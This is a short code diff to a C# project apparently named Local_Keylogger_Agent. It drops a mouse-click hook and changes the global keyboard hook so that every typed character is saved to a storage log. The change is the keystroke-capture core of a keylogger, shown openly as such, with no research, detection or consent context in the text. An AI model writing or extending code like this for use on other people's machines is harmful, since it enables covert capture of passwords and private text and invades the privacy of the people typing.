@@ -29,9 +29,6 @@ namespace Local_Keylogger_Agent
             // Keyboard
             globalHook.KeyDown += GlobalHook_KeyDown;
             globalHook.KeyPress += GlobalHook_KeyPress;
-
-            // Mouse
-            globalHook.MouseDown += GlobalHook_MouseDown;
         }
 
         private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
@@ -40,10 +37,7 @@ namespace Local_Keylogger_Agent
         }
         private void GlobalHook_KeyPress(object sender, KeyPressEventArgs e)
         {
-            // Handle key press events here
-        }
-        private void GlobalHook_MouseDown(object sender, MouseEventArgs e)
-        {
+            Storage.SaveOnlyKeyPressLog(e.KeyChar.ToString());
         }
     }
 }
